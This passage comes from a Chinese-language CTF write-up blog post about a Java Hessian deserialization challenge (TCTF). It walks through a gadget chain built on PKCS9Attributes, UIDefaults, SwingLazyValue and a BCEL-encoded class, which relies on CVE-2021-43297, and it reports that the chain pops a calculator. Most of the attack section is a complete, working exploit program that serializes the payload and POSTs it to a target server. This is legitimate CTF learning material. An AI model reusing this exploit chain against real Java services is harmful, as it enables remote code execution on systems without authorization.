+<p>运行之后弹出计算机<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679410791901-705afa5a-6a7d-4f2c-96ad-03cfd2cedff2.png#averageHue=%232c2b27&clientId=u2feb1e30-8019-4&from=paste&height=694&id=u87fed54a&name=image.png&originHeight=868&originWidth=1729&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1826445&status=done&style=none&taskId=u2056a5a3-be59-409b-b3bd-af4faaf5860&title=&width=1383.2" alt="image.png"><br>说明链子成立</p>
+<h1 id="细节剖析"><a href="#细节剖析" class="headerlink" title="细节剖析"></a>细节剖析</h1><p>观察一下PKCS9Attributes类的内部结构<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679411472725-dd87ee05-9126-4b13-8197-46f2bf4a02d7.png#averageHue=%23323430&clientId=u2feb1e30-8019-4&from=paste&height=232&id=u399e4275&name=image.png&originHeight=290&originWidth=987&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=420126&status=done&style=none&taskId=uc12d807d-1b5c-44cd-b234-ddbf231b603&title=&width=789.6" alt="image.png"><br>是不是没有无参构造方法，所以你想要通过反射的方法进行实例化十分困难，这边我尝试了好多次都是会报错（太菜了），理论上是肯定可以的，但是这里我们用了一个魔术去绕过构造方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/strongmore/p/15470175.html">https://www.cnblogs.com/strongmore/p/15470175.html</a></p>
+<p>还有个细节就是，我们可以看到上述poc我们是本地运行成功的，但是题目中你需要发送一个POST请求，要把你的Bytes字节流以post的形式在java中发送过去<br>因此最终POC应该是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Hessian2.shell;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> sun.security.pkcs.PKCS9Attribute;</span><br><span class="line"><span class="keyword">import</span> sun.security.pkcs.PKCS9Attributes;</span><br><span class="line"><span class="keyword">import</span> sun.security.util.DerInputStream;</span><br><span class="line"><span class="keyword">import</span> sun.security.util.DerValue;</span><br><span class="line"><span class="keyword">import</span> sun.security.util.ObjectIdentifier;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前提条件:CVE-2021-43297,打toString()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String targetUrl=<span class="string">&quot;http://localhost:8090/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">PKCS9Attributes</span> <span class="variable">s</span> <span class="operator">=</span> createWithoutConstructor(PKCS9Attributes.class);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">evil</span> <span class="operator">=</span> Repository.lookupClass(shell.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(evil.getBytes(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="string">&quot;_main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;payload&#125;&#125;));</span><br><span class="line"></span><br><span class="line">        setFieldValue(s,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        baos.write(<span class="number">67</span>);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        out.writeObject(s);</span><br><span class="line">        out.flushBuffer();</span><br><span class="line">        post(baos.toByteArray());</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);</span><br><span class="line">        <span class="comment">//input.readObject();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">post</span><span class="params">(<span class="type">byte</span>[] b)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(targetUrl);</span><br><span class="line">        <span class="type">HttpURLConnection</span> <span class="variable">con</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br><span class="line">        con.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">        con.setDoOutput(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> con.getOutputStream()) &#123;</span><br><span class="line">            os.write(b);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(con.getInputStream()));</span><br><span class="line">        String inputLine;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            content.append(inputLine);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(content.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679414268113-2e82c26d-8b6b-4b60-bea7-635b71f5ab05.png#averageHue=%232d2d24&clientId=ud3b9a615-1f91-4&from=paste&height=474&id=ude805dfc&name=image.png&originHeight=593&originWidth=1349&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1015304&status=done&style=none&taskId=uc4ce6a66-f2f0-42a7-bebd-afaf9ef73b8&title=&width=1079.2" alt="image.png"><br>成功复现</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/TCTF/" class="tag">#TCTF</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/29/HxpCTF2022&amp;2021%20_%20Web/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">HxpCTF2022&amp;2021 Web</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/29/%E5%AE%89%E6%B4%B5%E6%9D%AF2022%20_%20ezjaba/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">安洵杯2022 ezjaba</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
